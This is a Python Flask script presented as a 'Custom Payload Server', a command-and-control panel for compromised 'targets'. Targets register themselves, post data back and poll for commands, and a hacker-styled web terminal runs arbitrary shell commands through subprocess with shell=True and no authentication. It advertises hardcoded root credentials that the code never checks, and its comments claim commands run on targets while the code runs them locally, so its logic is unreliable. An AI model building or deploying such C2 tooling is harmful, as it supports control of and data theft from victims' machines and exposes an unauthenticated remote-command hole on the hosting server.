#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
import os
import datetime
import subprocess
import json
import threading

app = Flask(__name__)

# Auto store connected clients
clients = []
command_history = []

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔥 Payload Server Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: #0a0e27;
            color: #00ff9d;
            font-family: 'Courier New', monospace;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #00ff9d;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .status {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
        }
        .online {
            background: #00ff9d22;
            color: #00ff9d;
            border: 1px solid #00ff9d;
        }
        .terminal {
            background: #000000aa;
            border: 1px solid #00ff9d;
            border-radius: 8px;
            padding: 15px;
            height: 400px;
            overflow-y: auto;
            font-size: 13px;
            margin: 20px 0;
        }
        .input-line {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .cmd-input {
            flex: 1;
            background: #000;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            padding: 12px;
            font-family: monospace;
            font-size: 14px;
            border-radius: 5px;
        }
        .btn {
            background: #00ff9d;
            color: #0a0e27;
            border: none;
            padding: 12px 25px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            font-family: monospace;
        }
        .btn:hover {
            background: #00cc77;
        }
        .client-badge {
            background: #00ff9d22;
            padding: 5px 10px;
            border-radius: 5px;
            margin: 5px;
            display: inline-block;
            font-size: 12px;
        }
        .info {
            background: #00000066;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .green {
            color: #00ff9d;
        }
        hr {
            border-color: #00ff9d33;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🚀 CUSTOM PAYLOAD SERVER</h1>
        <p><span class="status online">● ACTIVE</span> &nbsp; | &nbsp; 
        Server: {{ server_url }} &nbsp; | &nbsp;
        Time: {{ current_time }}</p>
    </div>
    
    <div class="info">
        <b>📡 CONNECTION INFO (Auto-configured):</b><br>
        → User: <span class="green">root</span> (auto)<br>
        → Host: <span class="green">{{ server_url }}</span><br>
        → Password: <span class="green">auto@payload123</span><br>
        → Port: <span class="green">8080</span>
    </div>
    
    <div>
        <b>🔗 Connected Targets:</b>
        <div id="clients-list">None</div>
    </div>
    
    <div class="terminal" id="terminal">
        [*] Server started at {{ current_time }}<br>
        [*] Waiting for connections...<br>
        [*] Use the box below to send commands<br>
    </div>
    
    <div class="input-line">
        <input type="text" id="command" class="cmd-input" placeholder="Enter command (ls, whoami, id, etc.)" onkeypress="if(event.key==='Enter') sendCmd()">
        <button class="btn" onclick="sendCmd()">▶ EXECUTE</button>
    </div>
    <p style="font-size: 12px; text-align: center; margin-top: 20px;">
        💡 Commands will be sent to the first connected target
    </p>
</div>

<script>
    let currentTarget = null;
    
    function updateTerminal(text) {
        const term = document.getElementById('terminal');
        term.innerHTML += text + '<br>';
        term.scrollTop = term.scrollHeight;
    }
    
    async function getStatus() {
        try {
            const res = await fetch('/api/status');
            const data = await res.json();
            const clientsDiv = document.getElementById('clients-list');
            if(data.clients && data.clients.length > 0) {
                clientsDiv.innerHTML = data.clients.map(c => 
                    `<span class="client-badge">✅ ${c.ip} (${c.time})</span>`
                ).join('');
                if(!currentTarget && data.clients[0]) {
                    currentTarget = data.clients[0].id;
                    updateTerminal(`[+] Auto-connected to target: ${data.clients[0].ip}`);
                }
            } else {
                clientsDiv.innerHTML = '<span class="client-badge">⏳ Waiting for target...</span>';
            }
        } catch(e) {}
    }
    
    async function sendCmd() {
        const cmd = document.getElementById('command').value;
        if(!cmd) return;
        
        updateTerminal(`<span style="color: #ffaa00;">$> ${cmd}</span>`);
        document.getElementById('command').value = '';
        
        try {
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: cmd})
            });
            const data = await res.json();
            if(data.output) {
                updateTerminal(`${data.output}`);
            } else if(data.error) {
                updateTerminal(`<span style="color: #ff4444;">[!] Error: ${data.error}</span>`);
            }
        } catch(e) {
            updateTerminal(`<span style="color: #ff4444;">[!] Connection error</span>`);
        }
    }
    
    setInterval(getStatus, 3000);
    getStatus();
</script>
</body>
</html>
'''

@app.route('/')
def index():
    server_url = request.host
    return render_template_string(HTML, server_url=server_url, current_time=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

@app.route('/ping')
@app.route('/health')
def ping():
    '''For Uptime Robot'''
    return 'OK', 200

@app.route('/api/status')
def status():
    return jsonify({
        'clients': clients,
        'total': len(clients),
        'server_time': str(datetime.datetime.now())
    })

@app.route('/api/command', methods=['POST'])
def execute():
    '''Execute command on target (via webhook)'''
    data = request.json
    cmd = data.get('command', '')
    
    if not cmd:
        return jsonify({'error': 'No command'})
    
    try:
        # Execute command locally (since target connects here)
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = '[+] Command executed (no output)'
        
        # Store in history
        command_history.append({
            'time': str(datetime.datetime.now()),
            'command': cmd,
            'output': output[:500]
        })
        
        return jsonify({'output': output})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timeout (30s)'})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/register', methods=['POST'])
def register():
    '''Target registers itself here'''
    client_data = request.json
    client_info = {
        'id': request.remote_addr,
        'ip': request.remote_addr,
        'time': str(datetime.datetime.now()),
        'user_agent': request.headers.get('User-Agent', 'unknown')
    }
    
    # Remove old entry if exists
    global clients
    clients = [c for c in clients if c['id'] != client_info['id']]
    clients.append(client_info)
    
    print(f"\n[+] NEW TARGET CONNECTED!")
    print(f"    IP: {client_info['ip']}")
    print(f"    Time: {client_info['time']}")
    
    return jsonify({'status': 'registered', 'message': 'Connected to server'})

@app.route('/payload', methods=['GET', 'POST'])
def payload():
    '''Payload endpoint for target to fetch commands'''
    if request.method == 'POST':
        # Target sending data
        data = request.get_data()
        print(f"[+] Received {len(data)} bytes from target")
        return 'OK', 200
    
    # GET - target checking for commands
    return jsonify({'commands': command_history[-5:] if command_history else []})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║   🔥 CUSTOM PAYLOAD SERVER - HEROKU STYLE       ║
    ║                                                  ║
    ║   Server running on: http://0.0.0.0:{port}       ║
    ║   Control Panel: Open in browser                ║
    ║                                                  ║
    ║   ⚡ Auto-configured credentials:                ║
    ║      User: root                                  ║
    ║      Password: auto@payload123                   ║
    ║                                                  ║
    ║   🟢 Status: READY                               ║
    ║   📅 Started: {datetime.datetime.now()}          ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port)
